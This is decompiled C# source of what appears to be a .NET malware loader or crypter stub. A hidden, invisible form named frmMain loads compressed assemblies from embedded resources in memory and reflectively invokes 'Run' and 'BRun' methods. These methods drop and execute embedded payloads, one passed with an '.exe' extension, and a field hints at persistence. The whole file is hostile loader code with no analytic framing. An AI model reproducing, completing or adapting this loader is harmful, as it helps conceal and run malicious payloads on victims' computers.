using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

public class frmMain : Form
{
	public static Assembly assembly;

	public static object[] invoke;

	public static string Persistance;

	public static ComponentResourceManager manager2;

	public frmMain()
	{
		InitializeComponent();
	}

	public static void tick_Tick(object sender, EventArgs e)
	{
	}

	private static byte[] GetResource(string ResName)
	{
		return Deflate.Decompress(((MemoryStream)manager2.GetObject(ResName)).ToArray());
	}

	private void InitializeComponent()
	{
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		manager2 = new ComponentResourceManager(typeof(frmMain));
		Deflate.yolo = Assembly.Load(((MemoryStream)componentResourceManager.GetObject("d")).ToArray());
		assembly = Assembly.Load(Deflate.Decompress(((MemoryStream)componentResourceManager.GetObject("b")).ToArray()));
		Initiate("Run", new object[4]
		{
			0,
			"",
			GetResource("a"),
			true
		});
		Initiate("BRun", new object[7]
		{
			0,
			GetResource("clejqf"),
			".exe",
			"clejqf",
			true,
			true,
			true
		});
		((Control)this).SuspendLayout();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	public static object Initiate(string n, object[] t)
	{
		invoke = t;
		return AquireData(n);
	}

	public static object AquireData(string name)
	{
		Type[] types = assembly.GetTypes();
		MethodInfo[] methods = types[1].GetMethods();
		MethodInfo[] array = methods;
		foreach (MethodInfo methodInfo in array)
		{
			try
			{
				return methodInfo.Invoke(null, invoke);
			}
			catch
			{
			}
		}
		return null;
	}
}
